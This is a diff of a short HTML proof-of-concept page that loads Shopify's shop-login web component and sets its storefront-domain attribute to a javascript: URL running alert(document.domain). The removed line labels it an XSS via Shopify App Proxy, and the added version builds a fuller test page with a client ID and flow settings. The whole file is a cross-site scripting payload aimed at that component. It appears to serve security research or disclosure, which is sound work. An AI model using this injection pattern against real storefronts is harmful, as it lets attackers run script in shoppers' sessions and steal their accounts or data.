@@ -1,3 +1,15 @@
 <!DOCTYPE html>
-<script src="https://cdn.shopify.com/shopifycloud/shop-js/modules/v2/loader.shop-login.esm.js" type="module"></script>
-<shop-login storefront-domain="javascript:alert('XSS via Shopify App Proxy')"></shop-login>
+<html>
+<head>
+<script src="https://cdn.shopify.com/shopifycloud/shop-js/modules/v2/loader.shop-login.esm.js" crossorigin="anonymous" type="module"></script>
+</head>
+<body>
+<shop-login 
+  client-id="d5b6b2bbc81517098b2b7ada8b1d06b5"
+  storefront-domain="javascript:alert(document.domain)"
+  flow-version="customer_accounts"
+  presentation-mode="button"
+  variant="continue">
+</shop-login>
+</body>
+</html>
